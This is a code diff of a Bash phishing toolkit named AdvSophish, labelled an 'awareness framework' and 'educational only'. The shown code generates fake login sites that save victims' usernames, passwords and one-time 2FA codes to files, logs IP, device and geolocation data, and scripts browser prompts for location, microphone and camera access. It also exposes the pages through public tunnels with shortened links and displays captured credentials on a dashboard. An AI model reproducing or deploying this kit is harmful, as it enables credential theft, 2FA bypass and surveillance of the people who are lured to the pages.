@@ -3,7 +3,7 @@
 ##   AdvSophish - Advanced Phishing Awareness Framework
 ##   Author: mahi-cyberaware
 ##   GitHub: https://github.com/mahi-cyberaware/AdvSophish
-##   Version: 3.4.0
+##   Version: 3.5.0
 
 # ------------------------------- Trap & Globals -----------------------------
 trap 'return_to_menu' INT TERM
@@ -28,14 +28,14 @@ reset_color() { printf "%b" "$RESET"; }
 kill_pid() { for proc in php cloudflared loclx; do pkill -f "$proc" 2>/dev/null; done; }
 return_to_menu() { KEEP_RUNNING=false; kill_pid; echo -e "\n${YELLOW}[!] Returning to main menu...${RESET}"; sleep 1; main_menu; }
 
-# ------------------------------- Banner (toilet + fallback) ----------------
+# ------------------------------- Banner -------------------------------------
 install_toilet() {
     if command -v toilet &>/dev/null; then return 0; fi
     echo -e "${YELLOW}[!] 'toilet' not found. Installing...${RESET}"
     if command -v apt &>/dev/null; then sudo apt update && sudo apt install toilet -y
     elif command -v pkg &>/dev/null; then pkg install toilet -y
     elif command -v pacman &>/dev/null; then sudo pacman -S toilet --noconfirm
-    else echo -e "${RED}[-] Cannot install toilet. Using simple banner.${RESET}"; return 1
+    else echo -e "${RED}[-] Cannot install toilet. Using ASCII banner.${RESET}"; return 1
     fi
 }
 
@@ -54,7 +54,7 @@ banner() {
         echo "   ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
         echo -e "${CYAN}              Advanced Phishing Framework${RESET}"
     fi
-    echo -e "${WHITE}${DIM}                          v3.4.0${RESET}"
+    echo -e "${WHITE}${DIM}                          v3.5.0${RESET}"
     echo -e "${CYAN}                  mahi-cyberaware${RESET}\n"
 }
 
@@ -122,7 +122,6 @@ generate_site() {
     [[ -d "$site_dir" ]] && return
     mkdir -p "$site_dir"
 
-    # style.css (modern + permission popup hint)
     cat > "$site_dir/style.css" <<-CSS
 * { margin:0; padding:0; box-sizing:border-box; font-family:system-ui, -apple-system, sans-serif; }
 body { background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }
@@ -136,7 +135,6 @@ button:hover { opacity:0.9; transform:scale(1.01); }
 .permission-badge { background:#eef; padding:8px; border-radius:8px; margin-top:15px; font-size:12px; color:#555; }
 CSS
 
-    # index.html (login with permission requests)
     cat > "$site_dir/index.html" <<-HTML
 <!DOCTYPE html>
 <html>
@@ -145,18 +143,14 @@ CSS
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 <link rel="stylesheet" href="style.css">
 <script>
-// Request permissions when login button is clicked
 async function requestPermissions() {
     const statusDiv = document.getElementById('perm-status');
     statusDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Requesting permissions...';
     try {
-        // Geolocation
         const geo = await navigator.permissions.query({name:'geolocation'});
         if (geo.state === 'prompt') navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
-        // Microphone
         const mic = await navigator.permissions.query({name:'microphone'});
         if (mic.state === 'prompt') navigator.mediaDevices.getUserMedia({ audio: true }).then(stream=>stream.getTracks().forEach(t=>t.stop())).catch(e=>{});
-        // Camera
         const cam = await navigator.permissions.query({name:'camera'});
         if (cam.state === 'prompt') navigator.mediaDevices.getUserMedia({ video: true }).then(stream=>stream.getTracks().forEach(t=>t.stop())).catch(e=>{});
         statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Permissions requested';
@@ -181,13 +175,10 @@ async function requestPermissions() {
 </html>
 HTML
 
-    # login.php (saves creds + device info, then redirect to OTP)
     cat > "$site_dir/login.php" <<-PHP
 <?php
 \$creds = "$site_id|" . \$_POST['username'] . "|" . \$_POST['password'] . "|" . date('Y-m-d H:i:s');
 file_put_contents('../../auth/usernames.dat', \$creds . PHP_EOL, FILE_APPEND);
-
-// Collect detailed device info from ip.php data
 \$ip_file = '../../auth/ip_data.dat';
 if (file_exists('ip.txt')) {
     \$info = file_get_contents('ip.txt');
@@ -199,7 +190,6 @@ exit;
 ?>
 PHP
 
-    # otp.html (2FA page)
     cat > "$site_dir/otp.html" <<-HTML
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>2FA Verification</title>
@@ -213,7 +203,6 @@ PHP
 </form></div></body></html>
 HTML
 
-    # otp.php
     cat > "$site_dir/otp.php" <<-PHP
 <?php
 \$otp_data = "$site_id|" . \$_POST['otp'] . "|" . date('Y-m-d H:i:s');
@@ -223,7 +212,6 @@ exit;
 ?>
 PHP
 
-    # ip.php – captures IP, user agent, geolocation, screen, language, etc.
     cat > "$site_dir/ip.php" <<-'PHP'
 <?php
 $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
@@ -232,7 +220,7 @@ $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'unknown';
 $screen = $_POST['screen'] ?? 'unknown';
 $geo = $_POST['geo'] ?? 'unknown';
 $timestamp = date('Y-m-d H:i:s');
-$data = "IP: $ip | Agent: $ua | Lang: $lang | Screen: $screen | Geo: $geo | Time: $timestamp\n";
+$data = "IP: $ip | Device: $ua | Lang: $lang | Screen: $screen | Geo: $geo | Time: $timestamp\n";
 file_put_contents('ip.txt', $data);
 ?>
 <!DOCTYPE html>
@@ -252,7 +240,7 @@ PHP
 }
 
 generate_all_sites() {
-    echo -e "${GREEN}[+] Generating all phishing templates (with location/mic/camera requests)...${RESET}"
+    echo -e "${GREEN}[+] Generating all phishing templates...${RESET}"
     while IFS='|' read -r id name color icon; do
         generate_site "$id" "$name" "$color" "$icon"
     done <<-EOF
@@ -305,7 +293,7 @@ capture_data() {
     KEEP_RUNNING=true
     while $KEEP_RUNNING; do
         tail -n0 -f "$BASE_DIR/auth/usernames.dat" "$BASE_DIR/auth/otp.dat" "$BASE_DIR/auth/ip_data.dat" 2>/dev/null | while read line; do
-            if [[ "$line" =~ ^[a-z_]+ ]]; then
+            if [[ -n "$line" ]]; then
                 echo -e "${RED}[!]${GREEN} Capture: ${WHITE}$line${RESET}"
             fi
         done
@@ -344,7 +332,7 @@ start_cloudflared() {
     sleep 10
     url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" | head -1)
     if [[ -z "$url" ]]; then
-        echo -e "${RED}[-] Cloudflared failed (network may block it).${RESET}"
+        echo -e "${RED}[-] Cloudflared failed.${RESET}"
         return
     fi
     obfuscate_url "$url"
@@ -406,7 +394,7 @@ h1{color:#ff9800;}table{width:100%;border-collapse:collapse;margin-top:20px;}th,
 <tbody><?php foreach($otps as $o) echo "<tr><td>{$o['site']}</td><td>{$o['otp']}</td><td>{$o['time']}</td></tr>"; ?>
 </tbody></table>
 <h2>Device & IP Logs (<?=count($ips)?>)</h2><table><thead><tr><th>Log</th></tr></thead>
-<tbody><?php foreach($ips as $i) echo "<tr><td>$i</td></tr>"; ?></tbody></table>
+<tbody><?php foreach($ips as $i) echo "<tr><td>$i</td></tr>"; ?></tbody>
 </div></body></html>
 DASH
     fi
@@ -455,7 +443,7 @@ main_menu() {
             read -p "${GREEN}[+] : ${WHITE}" opt
             case $opt in 1) SHORTENER="isgd";; 2) SHORTENER="tinyurl";; 3) SHORTENER="none";; esac
             main_menu ;;
-        99) banner; echo -e "${CYAN}Author: mahi-cyberaware\nGitHub: https://github.com/mahi-cyberaware/AdvSophish\nVersion: 3.4.0\nLicense: Educational only\nFeatures: OTP capture, device info, permission popups${RESET}"
+        99) banner; echo -e "${CYAN}Author: mahi-cyberaware\nGitHub: https://github.com/mahi-cyberaware/AdvSophish\nVersion: 3.5.0\nLicense: Educational only\nFeatures: OTP capture, device info, permission popups${RESET}"
             read -n1 -p "Press any key..."; main_menu ;;
         *)
             if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#SITE_IDS[@]} )); then
@@ -486,7 +474,7 @@ tunnel_menu() {
         3|03) install_localxpose && start_localxpose "$SELECTED_SITE" "$port" ;;
         *) echo -e "${RED}Invalid${RESET}"; tunnel_menu ;;
     esac
-    main_menu   # after capture stops, return to main menu
+    main_menu
 }
 
 # ------------------------------- Start -------------------------------------
